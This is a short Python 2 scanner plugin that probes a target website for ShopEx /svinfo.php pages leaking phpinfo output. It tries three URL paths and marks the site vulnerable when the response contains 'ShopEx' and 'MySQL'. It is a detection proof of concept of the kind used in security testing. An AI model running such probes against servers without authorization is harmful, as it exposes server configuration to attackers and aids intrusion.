#!/usr/bin/env python
# -*- coding: utf-8 -*-
# @Author: Lcy
# @Date:   2016-09-20 15:34:41
# @Last Modified by:   Lcy
# @Last Modified time: 2016-09-27 09:42:35
import urllib2
class Exploit:
    def __init__(self,target,expfile):
        self.target = target
        self.result = {
            "name": "Shopex /svinfo.php phpinfo信息泄露漏洞",
            "author": "Lcy",
            "type": "website",
            "ref": "http://phpinfo.me",
            "status":False,
            "info":"",
            'filename':expfile,
            "target":target,
        }
    def verify(self):
        file_list =  ['/app/dev/svinfo.php?phpinfo=true',
                      '/install/svinfo.php?phpinfo=true',
                      '/app/dev/svinfo.php?download=true']
        for filename in file_list:
            verify_url = self.target + filename
            try:
                req = urllib2.urlopen(verify_url)
                content = req.read()
            except:
                continue
            if 'ShopEx' in content and 'MySQL' in content:
                self.result['status'] = True
                self.result['info'] = "目标存在Shopex /svinfo.php phpinfo信息泄露漏洞,验证url:%s" % verify_url
                return